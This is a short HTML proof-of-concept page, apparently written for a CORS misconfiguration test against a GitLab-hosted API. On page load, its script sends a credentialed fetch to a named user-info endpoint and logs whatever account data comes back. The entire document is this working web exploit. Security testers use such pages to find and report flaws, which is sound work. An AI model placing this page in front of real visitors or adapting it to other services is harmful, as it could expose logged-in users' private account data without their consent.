<!DOCTYPE html>
<html>
<head>
  <title>CORS PoC</title>
</head>
<body>
  <h2>Testing CORS...</h2>
  <script>
    fetch("https://alerts.gitlab.net/api/v4/user", {
      credentials: "include"
    })
    .then(response => response.text())
    .then(data => {
      console.log("[+] Response from GitLab:", data);
    })
    .catch(error => {
      console.log("[!] CORS blocked or error:", error);
    });
  </script>
</body>
</html>
